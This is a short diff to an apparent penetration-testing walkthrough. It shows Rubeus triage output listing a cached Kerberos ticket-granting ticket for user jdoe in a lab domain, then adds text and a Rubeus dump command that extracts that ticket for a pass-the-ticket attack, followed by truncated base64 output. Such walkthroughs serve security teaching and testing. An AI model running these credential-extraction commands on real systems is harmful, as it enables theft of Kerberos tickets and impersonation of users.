@@ -38,5 +38,12 @@ C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
  ------------------------------------------------------------------------------------------------------------------| 
  | 0x35b5d2 | jdoe @ DEV.DHITALCORP.LOCAL | krbtgt/DEV.DHITALCORP.LOCAL                 |   3/7/2024 4:12:45 PM    |
  ------------------------------------------------------------------------------------------------------------------| 
+```
+We can see jdoe's TGT is cached. We can simply extract his TGT and leverage it using pass the ticket attack.
 
 ```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2 /nowrap
+
+woIGwkMuSU92GH23KL....==
+```
+
